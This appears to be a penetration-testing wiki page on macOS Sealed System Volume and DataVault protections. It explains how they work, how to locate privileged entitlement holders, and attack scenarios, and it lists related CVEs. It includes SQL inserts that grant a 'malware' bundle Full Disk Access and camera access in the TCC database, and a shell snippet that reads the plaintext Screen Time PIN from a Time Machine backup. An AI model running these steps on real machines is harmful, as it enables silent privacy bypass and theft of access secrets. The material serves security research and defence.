# macOS Sealed System Volume & DataVault

{{#include ../../../banners/hacktricks-training.md}}

## Sealed System Volume (SSV)

### Basic Information

Starting with **macOS Big Sur (11.0)**, the system volume is cryptographically sealed using an **APFS snapshot hash tree**. This is called the **Sealed System Volume (SSV)**. The system partition is mounted **read-only** and any modification breaks the seal, which is verified during boot.<sup>[[11]](#references)</sup>

The SSV provides:
- **Tamper detection** — any modification to system binaries/frameworks changes the Merkle-tree root and invalidates the Apple-signed seal
- **Boot-time authentication** — the boot chain verifies the selected system snapshot before it becomes the root filesystem
- **Rootkit resistance** — even root cannot persistently replace files in the authenticated system snapshot without disabling authenticated root or compromising an authorized update path

SSV protects the **System** volume, not the writable **Data** volume paired with it. Firmlinks merge both volumes into the namespace visible at `/`, so a writable-looking path does not prove that the underlying object belongs to the sealed snapshot. FileVault and Data Protection cover confidentiality of data at rest; they are separate from SSV integrity.<sup>[[11]](#references)</sup>

### Checking SSV Status

```bash
# Check if authenticated root is enabled (SSV seal verification)
csrutil authenticated-root status

# List APFS snapshots (the sealed snapshot is the boot volume)
diskutil apfs listSnapshots disk3s1

# Check mount status (should show read-only)
mount | grep " / " 

# Show the volume group and the current Sealed field
diskutil apfs listVolumeGroups
diskutil apfs list | grep -B 8 -A 8 'Sealed:'
```

### Effective system view: SSV + Cryptex grafts

On recent macOS releases, not every executable visible below `/System` necessarily comes from the booted SSV snapshot. **Cryptexes** are separately authenticated APFS disk images whose content is grafted over selected directories; Rapid Security Responses can therefore replace security-sensitive components without rebuilding the base SSV. When triaging persistence or diffing system code, inventory the live mounts and the Preboot Cryptex store instead of hashing only the base snapshot:

```bash
mount | grep -Ei 'cryptex|graft'
find /System/Volumes/Preboot/Cryptexes -maxdepth 4 -type d 2>/dev/null
```

The boot-chain and Rapid Security Response details are covered in [macOS Architecture — Cryptexes](../mac-os-architecture/README.md#cryptexes-and-rapid-security-responses); this section focuses on the SSV boundary itself.

### SSV Writer Entitlements

Certain Apple system binaries have entitlements that allow them to modify or manage the sealed system volume:

| Entitlement | Purpose |
|---|---|
| `com.apple.private.apfs.revert-to-snapshot` | Revert the system volume to a previous snapshot |
| `com.apple.private.apfs.create-sealed-snapshot` | Create a new sealed snapshot after system updates |
| `com.apple.rootless.install.heritable` | Write to SIP-protected paths (inherited by child processes) |
| `com.apple.rootless.install` | Write to SIP-protected paths |

### Finding SSV Writers

```bash
# Search for binaries with SSV-related entitlements
find /System /usr -type f -perm +111 -exec sh -c '
  ents=$(codesign -d --entitlements - "{}" 2>&1)
  echo "$ents" | grep -q "apfs.revert-to-snapshot\|apfs.create-sealed-snapshot\|rootless.install" && echo "{}"
' \; 2>/dev/null

# Using the scanner database
sqlite3 /tmp/executables.db "
SELECT e.path, c.name
FROM executables e
JOIN executable_capabilities ec ON e.id = ec.executable_id
JOIN capabilities c ON ec.capability_id = c.id
WHERE c.name = 'ssv_writer';"
```

### Attack Scenarios

#### Snapshot Rollback Attack

If an attacker compromises a binary with `com.apple.private.apfs.revert-to-snapshot`, they can **roll back the system volume to a pre-update state**, restoring known vulnerabilities:

```bash
# Conceptual — the snapshot revert operation would:
# 1. List available snapshots
diskutil apfs listSnapshots disk3s1

# 2. Revert to an older snapshot (requires the entitlement)
# This restores the system to a state with known, patched vulnerabilities
```

> [!WARNING]
> Snapshot rollback effectively **undoes security updates**, restoring previously-patched kernel and system vulnerabilities. This is one of the most dangerous operations possible on modern macOS.

#### System Binary Replacement

With SIP bypass + SSV write capability, an attacker can:

1. Mount the system volume read-write
2. Replace a system daemon or framework library with a trojaned version
3. Re-seal the snapshot (or accept the broken seal if SIP is already degraded)
4. The rootkit persists across reboots and is invisible to userland detection tools

### Real-World CVEs

| CVE | Description |
|---|---|
| CVE-2021-30892 | **Shrootless** — SIP bypass abusing `system_installd`'s `com.apple.rootless.install.heritable` entitlement to run arbitrary post-install scripts ([Microsoft](https://www.microsoft.com/en-us/security/blog/2021/10/28/microsoft-finds-new-macos-vulnerability-shrootless-that-could-bypass-system-integrity-protection/))<sup>[[1]](#references)</sup> |
| CVE-2022-22583 | SIP bypass: `system_installd` staged the post-install script in a SIP-protected folder under `/tmp`, but `/tmp` itself isn't SIP-protected, so the folder could be swapped by mounting an image over it ([Trend Micro](https://www.trendmicro.com/en_us/research/22/l/a-technical-analysis-of-cve-2022-22583-and-cve-2022-32800.html))<sup>[[2]](#references)</sup> |
| CVE-2022-46689 | **MacDirtyCow** — copy-on-write race in XNU allowing writes to read-only root-owned files ([Worth Doing Badly](https://worthdoingbadly.com/macdirtycow/))<sup>[[3]](#references)</sup> |

---

## DataVault

### Basic Information

**DataVault** is an entitlement-gated filesystem protection for sensitive files and directories. The BSD flag `UF_DATAVAULT` (`0x00000080`) marks an object as requiring an entitlement for both reading and writing; unlike normal DAC, merely becoming **root** or receiving Full Disk Access does not satisfy that check while the protection is enforced.<sup>[[4]](#references)[[13]](#references)</sup>

Do not use “DataVault” as a synonym for every protected database. The TCC databases are governed by TCC/FDA and SIP-specific policy (see [macOS TCC](macos-tcc/README.md)), while keychain item access also depends on Keychain ACLs and cryptographic protection (see [macOS Keychain](../../macos-red-teaming/macos-keychain.md)). Actual DataVault examples commonly appear as service-owned stores below `/private/var/folders/.../0/`, such as the Screen Time store; the flag is visible as `datavault` in BSD file flags when the parent can be statted.

### DataVault Controller Entitlements

| Entitlement | Boundary |
|---|---|
| `com.apple.rootless.datavault.controller` | Access/manage `UF_DATAVAULT` objects<sup>[[13]](#references)</sup> |
| `com.apple.private.tcc.manager` | Manage TCC decisions; this is a related but separate privacy boundary |
| `com.apple.private.tcc.allow` | Bypass selected TCC services named in the entitlement value |
| `com.apple.rootless.storage.TCC` | Write the SIP-protected TCC store |

A process that combines a DataVault-controller entitlement with FDA, backup, indexing, or IPC functionality is especially interesting: look for a confused-deputy primitive that copies a protected object to an ordinary path rather than trying to open the vault directly.<sup>[[14]](#references)</sup>

### Finding DataVault Controllers

```bash
# BSD flags: a protected object is printed with the `datavault` keyword
ls -ldeO@ /private/var/folders/*/*/0/com.apple.ScreenTimeAgent 2>/dev/null
sudo find /private/var/folders -flags +datavault -print 2>/dev/null

# Find Apple binaries carrying DataVault/TCC controller entitlements
find /System /usr -type f -perm +111 -exec sh -c '
  ents=$(codesign -d --entitlements - "{}" 2>&1)
  echo "$ents" | grep -q "datavault.controller\|private.tcc\|rootless.storage.TCC" && echo "{}"
' \; 2>/dev/null

# Using the scanner
sqlite3 /tmp/executables.db "
SELECT e.path, c.name
FROM executables e
JOIN executable_capabilities ec ON e.id = ec.executable_id
JOIN capabilities c ON ec.capability_id = c.id
WHERE c.name = 'datavault_controller';"
```

### Attack Scenarios

#### Direct TCC Database Modification (separate TCC boundary)

If an attacker compromises a TCC manager process (e.g., via code injection into one carrying `com.apple.private.tcc.manager`), they can **directly modify the TCC database** to grant any application any TCC permission:<sup>[[12]](#references)</sup>

```sql
-- Grant Full Disk Access to a malicious binary (conceptual)
INSERT INTO access (service, client, client_type, auth_value, auth_reason, auth_version)
VALUES ('kTCCServiceSystemPolicyAllFiles', 'com.attacker.malware', 0, 2, 4, 1);

-- Grant camera access without a prompt
INSERT INTO access (service, client, client_type, auth_value, auth_reason, auth_version)
VALUES ('kTCCServiceCamera', 'com.attacker.malware', 0, 2, 4, 1);
```

> [!CAUTION]
> TCC database modification is the **ultimate privacy bypass** — it grants any permission silently, without any user prompt or visible indicator. Historically, multiple macOS privilege escalation chains have ended with TCC database writes as the final payload.

#### Keychain Database Access

Raw access to a keychain backing database is not equivalent to plaintext secret access. If another privilege boundary lets an attacker copy the database, key material and item ACLs still have to be attacked; see the dedicated [macOS Keychain](../../macos-red-teaming/macos-keychain.md) page instead of assuming a DataVault-controller entitlement is sufficient.

#### Backup-copy boundary: Time Machine

A 2026 analysis demonstrated a useful general pattern: `backupd` carries both `com.apple.rootless.datavault.controller` and Full Disk Access so it can copy protected stores. On the tested configuration, `/private/var/folders` was included in Time Machine and the mounted backup copy did not enforce the live DataVault boundary. The researcher used this to locate the Screen Time SQLite store and read its plaintext restrictions PIN without opening the live vault. Treat this as a **copy-boundary attack**: enumerate backup, export, migration, indexing, and diagnostic deputies that can materialize vault data under a weaker mount or path.<sup>[[13]](#references)[[14]](#references)</sup>

```bash
# Confirm the deputy's privileges and whether the source tree is included
codesign -d --entitlements - /System/Library/CoreServices/TimeMachine/backupd 2>&1
tmutil isexcluded /private/var/folders

# Inspect the newest mounted backup; paths vary per host
backup="$(tmutil latestbackup)"
db="$(find "$backup/Data/private/var/folders" -path '*/com.apple.ScreenTimeAgent/Store/RMAdminStore-Local.sqlite' -print -quit 2>/dev/null)"
sqlite3 "$db" 'SELECT ZPASSCODE1 FROM ZCOREORGANIZATIONSETTINGS WHERE ZPASSCODE1 IS NOT NULL LIMIT 1;'
```

This behavior is version- and backup-layout-dependent. Validate it on the target build, and remember that an encrypted Time Machine destination only protects the copy while it is locked; once mounted, its access controls become part of the attack surface.

### Real-World CVEs Involving DataVault/TCC Bypass

| CVE | Description |
|---|---|
| CVE-2024-44131 | FileProvider symlink race letting a privileged helper reach TCC-protected data ([Jamf](https://www.jamf.com/blog/tcc-bypass-steals-data-from-icloud/))<sup>[[5]](#references)</sup> |
| CVE-2023-40424 | As root, **create a new user whose `NFSHomeDirectory` points at an attacker-controlled `TCC.db`**; on login `tccd` consumes it and the grants apply, reaching other users' data ([Kandji](https://blog.kandji.io/malware-bypass-tcc))<sup>[[6]](#references)</sup> |
| CVE-2021-30970 | "powerdir": changing the user's home dir to plant an attacker-controlled TCC.db ([Microsoft](https://www.microsoft.com/en-us/security/blog/2022/01/10/new-macos-vulnerability-powerdir-could-lead-to-unauthorized-user-data-access/))<sup>[[7]](#references)</sup> |
| CVE-2021-30713 | Bundle-conclusion flaw letting an app **inherit the TCC grants of a donor bundle** without a prompt; exploited in the wild by **XCSSET** to screenshot the desktop ([Jamf](https://www.jamf.com/blog/zero-day-tcc-bypass-discovered-in-xcsset-malware/))<sup>[[8]](#references)</sup> |
| CVE-2020-9934 | `tccd` built the DB path from `$HOME`, so `launchctl setenv HOME` redirected it to an attacker-controlled `TCC.db` ([Matt Shockley](https://medium.com/@mattshockl/cve-2020-9934-bypassing-the-os-x-transparency-consent-and-control-tcc-framework-for-4e14806f1de8))<sup>[[9]](#references)</sup> |
| CVE-2020-29621 | `coreaudiod` held `com.apple.private.tcc.manager` **and** disabled library validation, so a HAL plug-in dropped in `/Library/Audio/Plug-Ins/HAL` could grant arbitrary TCC rights ([Wojciech Reguła](https://wojciechregula.blog/post/play-the-music-and-bypass-tcc-aka-cve-2020-29621/))<sup>[[10]](#references)</sup> |



## References

- [1] [Microsoft finds new macOS vulnerability, Shrootless, that could bypass System Integrity Protection](https://www.microsoft.com/en-us/security/blog/2021/10/28/microsoft-finds-new-macos-vulnerability-shrootless-that-could-bypass-system-integrity-protection/)
- [2] [Technical Analysis: CVE-2022-22583 - Trend Micro](https://www.trendmicro.com/en_us/research/22/l/a-technical-analysis-of-cve-2022-22583-and-cve-2022-32800.html)
- [3] [MacDirtyCow - Worth Doing Badly](https://worthdoingbadly.com/macdirtycow/)
- [4] [Apple Platform Security — Data Protection](https://support.apple.com/guide/security/data-protection-overview-sece3bee0835/web)
- [5] [Jamf Threat Labs - CVE-2024-44131: TCC bypass steals data from iCloud](https://www.jamf.com/blog/tcc-bypass-steals-data-from-icloud/)
- [6] [Kandji - Uncovering macOS Malware: Bypassing TCC](https://blog.kandji.io/malware-bypass-tcc)
- [7] [New macOS vulnerability, "powerdir," could lead to unauthorized user data access](https://www.microsoft.com/en-us/security/blog/2022/01/10/new-macos-vulnerability-powerdir-could-lead-to-unauthorized-user-data-access/)
- [8] [Zero-Day TCC bypass discovered in XCSSET malware](https://www.jamf.com/blog/zero-day-tcc-bypass-discovered-in-xcsset-malware/)
- [9] [CVE-2020–9934: Bypassing the macOS Transparency, Consent, and Control (TCC) Framework](https://medium.com/@mattshockl/cve-2020-9934-bypassing-the-os-x-transparency-consent-and-control-tcc-framework-for-4e14806f1de8)
- [10] [Play the music and bypass TCC aka CVE-2020-29621](https://wojciechregula.blog/post/play-the-music-and-bypass-tcc-aka-cve-2020-29621/)
- [11] [The Nightmare of Apple OTA Updates (APFS Snapshots)](https://jhftss.github.io/The-Nightmare-of-Apple-OTA-Update/)
- [12] [Objective-See — TCC Exploitation](https://objective-see.org/blog/blog_0x4C.html)
- [13] [XNU `stat.h` — `UF_DATAVAULT`](https://github.com/apple-oss-distributions/xnu/blob/main/bsd/sys/stat.h)
- [14] [How to bypass your own Screen Time passcode — source and Time Machine/DataVault analysis](https://tangled.org/dunkirk.sh/zera/commit/e6b6236c395e5c9ec1a27ad2a76217d8cc2b4312)
{{#include ../../../banners/hacktricks-training.md}}
